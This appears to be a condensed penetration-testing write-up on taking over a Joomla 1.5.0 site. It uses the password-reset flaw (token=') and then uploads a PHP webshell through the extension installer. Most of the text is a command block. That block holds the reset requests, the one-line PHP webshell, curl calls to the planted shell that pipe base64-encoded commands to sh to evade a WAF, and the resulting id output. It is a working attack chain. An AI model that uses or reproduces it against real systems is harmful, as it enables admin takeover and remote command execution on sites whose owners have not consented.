---
id: 1cbf279e6ced
title: "This Is How a Hacker Hacks: Part 2 - Through the Admin Door"
source_url: https://cyphernova1337.medium.com/this-is-how-a-hacker-hacks-part-2-through-the-admin-door-16ba29c3c50c
author: "CypherNova1337"
publication_date: 2026-08-19
category: privilege-escalation
category_label: "Privilege Escalation"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "penetration-testing"
  - "infosec"
  - "cybersecurity"
  - "hacking"
  - "bug-bounty"
tools:
  - "curl"
quick_test: "Test the password reset functionality of Joomla 1.5.0 and check for WAF weaknesses by uploading a ZIP file with a webshell."
---

## Use case

The vulnerability lies in the password reset functionality of Joomla 1.5.0, allowing an attacker to gain administrative access through a weak WAF and exploit the system using a webshell.

## Steps to test

1. Execute a password reset request using POST /index.php?option=com_user&task=confirmreset with body token='.
2. Complete the password reset using POST /index.php?option=com_user&task=completereset with body password=...&password2=... .
3. Log in to the admin panel at /administrator/ with the new credentials.
4. Attempt to upload a ZIP file containing a webshell through the extension installer.
5. Use the webshell to execute commands, ensuring to base64 encode long commands to bypass WAF restrictions.

## Commands

```text
POST /index.php?option=com_user&task=confirmreset body: token='
POST /index.php?option=com_user&task=completereset body: password=...&password2=...
curl -sk -G 'https://webdoc.example.ac.th/components/com_alr0y/alr0y.php' --data-urlencode 'c=echo $(printf '%s' "$COMMAND" | base64 -w0) | base64 -d | sh'
nohup <command> > /tmp/out.log 2>&1 &
POST /index.php?option=com_user&task=confirmreset
body: token='
POST /index.php?option=com_user&task=completereset
body: password=...&password2=...
<?php system($_GET[c]); ?>
https://webdoc.example.ac.th/components/com_alr0y/alr0y.php?c=id
→ uid=500(webskru) gid=500(webskru)
# on the attacker's box
b64=$(printf '%s' "$COMMAND" | base64 -w0)
curl -sk -G "$SHELL_URL" --data-urlencode "c=echo $b64 | base64 -d | sh"
nohup <command> > /tmp/out.log 2>&1 &   # detach, then poll the log
POST /index.php?option=com_user&task=confirmreset
```

## Source

- Author: CypherNova1337
- Writeup: https://cyphernova1337.medium.com/this-is-how-a-hacker-hacks-part-2-through-the-admin-door-16ba29c3c50c

_For authorized testing only. Credit the original author._
